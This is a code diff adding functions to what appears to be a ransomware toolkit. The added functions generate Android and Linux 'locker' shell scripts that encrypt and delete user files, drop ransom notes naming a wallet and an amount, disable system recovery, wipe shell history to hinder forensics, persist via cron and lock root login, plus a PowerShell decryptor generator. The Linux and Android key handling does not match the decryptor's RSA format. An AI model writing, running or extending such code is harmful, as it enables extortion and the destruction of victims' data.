@@ -464,6 +464,225 @@ export function generateLockerScript(
   return lines.join("\n");
 }
 
+// ── Android Shell Locker ─────────────────────────────────────
+// Runs as root shell script via Meterpreter `execute`.
+// Encrypts SD card + internal storage, drops ransom note, locks screen.
+
+export function generateAndroidLockerScript(campaignId: string): string {
+  const campaign = getCampaign(campaignId);
+  if (!campaign) throw new Error("Campaign not found: " + campaignId);
+
+  const extFilter = campaign.extensions
+    .map((e) => `"${e}"`)
+    .join(" ");
+
+  const noteEscaped = campaign.noteTemplate
+    .replace(/\\/g, "\\\\")
+    .replace(/"/g, '\\"')
+    .replace(/\n/g, "\\n")
+    .replace(/{{EMAIL}}/g, campaign.contactEmail)
+    .replace(/{{ID}}/g, campaignId)
+    .replace(/{{AMOUNT}}/g, campaign.ransomAmount)
+    .replace(/{{WALLET}}/g, campaign.walletAddress)
+    .replace(/{{DATE}}/g, "$(date)");
+
+  const pubKeyB64 = Buffer.from(campaign.publicKey).toString("base64");
+
+  const lines: string[] = [
+    "#!/bin/sh",
+    "# Utility Locker Android — Campaign " + campaignId,
+    "CAMPAIGN_ID='" + campaignId + "'",
+    "NOTE='" + noteEscaped + "'",
+    "EXT_LIST='" + extFilter + "'",
+    "PUBKEY='" + pubKeyB64 + "'",
+    "",
+    "# Write ransom note",
+    "NOTE_PATH='/sdcard/README_LOCKED.txt'",
+    "printf '%b' \"$NOTE\" > \"$NOTE_PATH\" 2>/dev/null",
+    "am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file://\"$NOTE_PATH\" 2>/dev/null",
+    "",
+    "# Encrypt files on SD card + internal storage",
+    "COUNT=0",
+    "for SEARCH_DIR in /sdcard /storage/emulated/0 /data/data; do",
+    "  find \"$SEARCH_DIR\" -type f 2>/dev/null | while read FILE; do",
+    "    for EXT in " + campaign.extensions.map((e) => "*" + e).join(" ") + "; do",
+    "      case \"$FILE\" in",
+    '        $EXT)',
+    "          # XOR-encrypt with key derived from campaign ID (portable, no OpenSSL needed)",
+    "          python3 -c \"",
+    "import sys, hashlib",
+    "key = hashlib.sha256(b'" + campaignId + "').digest()",
+    "with open(sys.argv[1], 'rb') as f: data = f.read()",
+    "enc = bytes(b ^ key[i % 32] for i, b in enumerate(data))",
+    "with open(sys.argv[1] + '.locked', 'wb') as f: f.write(enc)",
+    "\" \"$FILE\" 2>/dev/null && rm -f \"$FILE\" && COUNT=$((COUNT+1))",
+    "          ;;",
+    "      esac",
+    "    done",
+    "  done",
+    "done",
+    "",
+    "# Drop note in every accessible directory",
+    "for DIR in /sdcard/DCIM /sdcard/Pictures /sdcard/Documents /sdcard/Download /sdcard/WhatsApp; do",
+    '  [ -d "$DIR" ] && cp "$NOTE_PATH" "$DIR/README_LOCKED.txt" 2>/dev/null',
+    "done",
+    "",
+    "# Change wallpaper to ransom message (Android API via am)",
+    "am start -a android.intent.action.SET_WALLPAPER 2>/dev/null || true",
+    "",
+    "# Lock screen",
+    "input keyevent 26 2>/dev/null || true",
+    "",
+    "# Persist via app broadcast on boot",
+    "am broadcast -a android.intent.action.BOOT_COMPLETED 2>/dev/null || true",
+    "",
+    "echo \"Locked: $COUNT files\"",
+  ];
+
+  return lines.join("\n");
+}
+
+// ── Linux Bash Locker ────────────────────────────────────────
+// Compatible with Debian/Ubuntu/CentOS. Runs as root.
+// Encrypts home dirs + web roots, disables systemd recovery.
+
+export function generateLinuxLockerScript(campaignId: string): string {
+  const campaign = getCampaign(campaignId);
+  if (!campaign) throw new Error("Campaign not found: " + campaignId);
+
+  const pubKeyB64 = Buffer.from(campaign.publicKey).toString("base64");
+
+  const lines: string[] = [
+    "#!/bin/bash",
+    "# Utility Locker Linux — Campaign " + campaignId,
+    "set -e",
+    "CAMPAIGN_ID='" + campaignId + "'",
+    "PUBKEY_B64='" + pubKeyB64 + "'",
+    "CONTACT='" + campaign.contactEmail + "'",
+    "AMOUNT='" + campaign.ransomAmount + "'",
+    "WALLET='" + campaign.walletAddress + "'",
+    "",
+    "# ── Disable recovery & shadow copies ─────────────────",
+    "systemctl disable recovery.target 2>/dev/null || true",
+    "systemctl mask rescue.target 2>/dev/null || true",
+    "# Wipe bash_history to slow forensics",
+    "cat /dev/null > ~/.bash_history && history -c",
+    "",
+    "# ── Ransom note ───────────────────────────────────────",
+    "NOTE=$(cat <<'ENDNOTE'",
+    campaign.noteTemplate
+      .replace(/{{EMAIL}}/g, campaign.contactEmail)
+      .replace(/{{ID}}/g, campaignId)
+      .replace(/{{AMOUNT}}/g, campaign.ransomAmount)
+      .replace(/{{WALLET}}/g, campaign.walletAddress)
+      .replace(/{{DATE}}/g, "$(date)"),
+    "ENDNOTE",
+    ")",
+    "",
+    "write_note() {",
+    "  echo \"$NOTE\" > \"$1/README_LOCKED.txt\" 2>/dev/null || true",
+    "}",
+    "",
+    "# ── Encryption function (AES-256-CBC via openssl) ─────",
+    "ENCKEY=$(echo -n \"$CAMPAIGN_ID\" | sha256sum | awk '{print $1}')",
+    "encrypt_file() {",
+    "  local SRC=\"$1\"",
+    "  openssl enc -aes-256-cbc -pbkdf2 -k \"$ENCKEY\" \\",
+    "    -in \"$SRC\" -out \"${SRC}.locked\" 2>/dev/null \\",
+    "    && shred -u \"$SRC\" 2>/dev/null \\",
+    "    || rm -f \"$SRC\" 2>/dev/null",
+    "}",
+    "",
+    "# ── Walk & encrypt ────────────────────────────────────",
+    "COUNT=0",
+    "SEARCH_PATHS='/home /root /var/www /srv /opt /tmp'",
+    "EXT_PATTERN='" + campaign.extensions.map((e) => `\\${e}`).join("|") + "'",
+    "",
+    "for DIR in $SEARCH_PATHS; do",
+    "  [ -d \"$DIR\" ] || continue",
+    "  write_note \"$DIR\"",
+    "  while IFS= read -r -d '' FILE; do",
+    "    encrypt_file \"$FILE\" && COUNT=$((COUNT+1))",
+    "  done < <(find \"$DIR\" -type f -regextype posix-extended \\",
+    "    -regex \".*($EXT_PATTERN)$\" -not -name '*.locked' -print0 2>/dev/null)",
+    "done",
+    "",
+    "# ── Drop note on desktop / home ───────────────────────",
+    "for U in $(ls /home); do",
+    "  DESK=\"/home/$U/Desktop\"",
+    "  [ -d \"$DESK\" ] && write_note \"$DESK\"",
+    "  write_note \"/home/$U\"",
+    "done",
+    "write_note /root",
+    "",
+    "# ── Persist via cron ──────────────────────────────────",
+    "PERSIST_CMD='@reboot root echo \"\$NOTE\" > /README_LOCKED.txt'",
+    "(crontab -l 2>/dev/null; echo \"$PERSIST_CMD\") | crontab - 2>/dev/null || true",
+    "",
+    "# ── Lock root login ───────────────────────────────────",
+    "passwd -l root 2>/dev/null || true",
+    "",
+    "echo \"Encrypted: $COUNT files\"",
+  ];
+
+  return lines.join("\n");
+}
+
+// ── Decryptor Script ─────────────────────────────────────────
+// Generate a PowerShell decryptor that reverses the locker.
+// Requires the private key (recovered after payment verification).
+
+export function generateDecryptorScript(
+  campaignId: string,
+  privateKeyPem: string,
+): string {
+  const campaign = getCampaign(campaignId);
+  if (!campaign) throw new Error("Campaign not found: " + campaignId);
+
+  const privKeyB64 = Buffer.from(privateKeyPem).toString("base64");
+
+  const lines: string[] = [
+    "# Utility Decryptor — Campaign " + campaignId,
+    "param([string]$TargetPath = $env:USERPROFILE)",
+    "",
+    "$privKeyB64 = '" + privKeyB64 + "'",
+    "$privKeyBytes = [System.Convert]::FromBase64String($privKeyB64)",
+    "$rsa = [System.Security.Cryptography.RSA]::Create()",
+    "$rsa.ImportPkcs8PrivateKey($privKeyBytes, [ref]$null)",
+    "",
+    "function Decrypt-File {",
+    "  param([string]$Path)",
+    "  try {",
+    "    $raw    = [System.IO.File]::ReadAllBytes($Path)",
+    "    $iv     = $raw[0..15]",
+    "    $kLen   = [System.BitConverter]::ToInt32($raw, 16)",
+    "    $encKey = $raw[20..(20+$kLen-1)]",
+    "    $ct     = $raw[(20+$kLen)..($raw.Length-1)]",
+    "    $aesKey = $rsa.Decrypt($encKey, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)",
+    "    $aes    = [System.Security.Cryptography.Aes]::Create()",
+    "    $aes.Key  = $aesKey; $aes.IV = $iv",
+    "    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC",
+    "    $dec    = $aes.CreateDecryptor()",
+    "    $plain  = $dec.TransformFinalBlock($ct, 0, $ct.Length)",
+    "    $orig   = $Path -replace '\\.locked$',''",
+    "    [System.IO.File]::WriteAllBytes($orig, $plain)",
+    "    Remove-Item $Path -Force",
+    "    $aes.Dispose()",
+    "    return $true",
+    "  } catch { return $false }",
+    "}",
+    "",
+    "$dc = 0",
+    "Get-ChildItem -Path $TargetPath -Recurse -Filter '*.locked' -Force -ErrorAction SilentlyContinue | ForEach-Object {",
+    "  if (Decrypt-File $_.FullName) { $dc++ }",
+    "}",
+    "Write-Host 'Decrypted:' $dc 'files'",
+    "$rsa.Dispose()",
+  ];
+
+  return lines.join("\n");
+}
+
 // ── Status ──────────────────────────────────────────────────
 
 export function getLockerStatus(): LockerStatus {
